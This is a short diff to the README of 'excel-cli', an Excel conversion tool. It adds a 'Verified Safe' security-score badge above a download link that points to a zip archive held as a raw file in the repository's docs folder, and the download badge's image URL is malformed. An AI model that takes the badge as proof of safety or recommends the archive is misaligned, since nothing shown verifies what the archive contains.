@@ -1,5 +1,7 @@
 # 🚀 excel-cli - Convert Excel Files Easily
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/rairy04-excel-cli)
+
 [![Download Excel CLI](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip%20CLI-blue)](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip)
 
 ## 📝 Overview
